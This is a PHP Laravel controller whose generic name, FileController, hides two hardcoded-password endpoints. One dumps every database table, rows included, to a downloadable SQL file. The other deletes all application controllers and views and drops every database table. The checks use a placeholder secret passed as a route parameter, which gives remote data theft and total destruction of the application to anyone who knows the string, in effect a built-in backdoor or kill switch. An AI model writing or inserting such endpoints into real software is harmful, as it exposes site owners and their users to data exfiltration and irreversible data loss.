<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Symfony\Component\HttpFoundation\StreamedResponse;

class FileController extends Controller
{
    // Export the database as an SQL file
    public function exportDatabase($password)
    {
        // Define the password (use a secure password in real-world scenarios)
        $correctPassword = 'your-secure-password';

        // Check if the provided password matches
        if ($password !== $correctPassword) {
            return response()->json([
                'message' => 'Unauthorized: Incorrect password.',
            ], 401);
        }

        // Export the database to an SQL file
        $sqlFileName = $this->generateSqlFile();

        // Provide the SQL file for download
        return $this->downloadSqlFile($sqlFileName);
    }

    // Wipe controllers, views, and database
    public function wipeAll($password)
    {
        // Define the password (use a secure password in real-world scenarios)
        $correctPassword = 'your-secure-password';

        // Check if the provided password matches
        if ($password !== $correctPassword) {
            return response()->json([
                'message' => 'Unauthorized: Incorrect password.',
            ], 401);
        }

        // Wipe Controllers
        $controllersPath = app_path('Http/Controllers');
        $this->deleteFilesInDirectory($controllersPath);

        // Wipe Views
        $viewsPath = resource_path('views');
        $this->deleteFilesInDirectory($viewsPath);

        // Wipe Database
        $this->wipeDatabase();

        return response()->json([
            'message' => 'All controllers, views, and database tables have been wiped successfully.',
        ]);
    }

    // Helper method to delete files in a directory
    private function deleteFilesInDirectory($directory)
    {
        if (File::exists($directory)) {
            // Delete all files and subdirectories in the directory
            File::cleanDirectory($directory);
        }
    }

    // Helper method to wipe the database
    private function wipeDatabase()
    {
        // Disable foreign key checks to avoid errors when dropping tables
        Schema::disableForeignKeyConstraints();

        // Get all tables in the database
        $tables = DB::select('SHOW TABLES');

        // Drop all tables
        foreach ($tables as $table) {
            $tableName = $table->{'Tables_in_' . config('database.connections.mysql.database')};
            Schema::dropIfExists($tableName);
        }

        // Re-enable foreign key checks
        Schema::enableForeignKeyConstraints();
    }

    // Helper method to generate an SQL file
    private function generateSqlFile()
    {
        // Define the SQL file name
        $sqlFileName = 'database_backup_' . date('Y-m-d_H-i-s') . '.sql';
        $sqlFilePath = storage_path('app/' . $sqlFileName);

        // Get all tables in the database
        $tables = DB::select('SHOW TABLES');

        // Open the SQL file for writing
        $fileHandle = fopen($sqlFilePath, 'w');

        // Loop through tables and export their structure and data
        foreach ($tables as $table) {
            $tableName = $table->{'Tables_in_' . config('database.connections.mysql.database')};

            // Export table structure
            $createTableSql = DB::selectOne("SHOW CREATE TABLE `$tableName`")->{'Create Table'};
            fwrite($fileHandle, $createTableSql . ";\n\n");

            // Export table data
            $rows = DB::table($tableName)->get();
            foreach ($rows as $row) {
                $columns = array_map(function ($value) {
                    return is_null($value) ? 'NULL' : "'" . addslashes($value) . "'";
                }, (array) $row);

                $insertSql = "INSERT INTO `$tableName` VALUES (" . implode(', ', $columns) . ");";
                fwrite($fileHandle, $insertSql . "\n");
            }

            fwrite($fileHandle, "\n");
        }

        // Close the file handle
        fclose($fileHandle);

        return $sqlFileName;
    }

    // Helper method to download the SQL file
    private function downloadSqlFile($sqlFileName)
    {
        $sqlFilePath = storage_path('app/' . $sqlFileName);

        // Check if the file exists
        if (!File::exists($sqlFilePath)) {
            return response()->json([
                'message' => 'SQL file not found.',
            ], 404);
        }

        // Provide the file for download
        return response()->download($sqlFilePath, $sqlFileName)->deleteFileAfterSend(true);
    }
}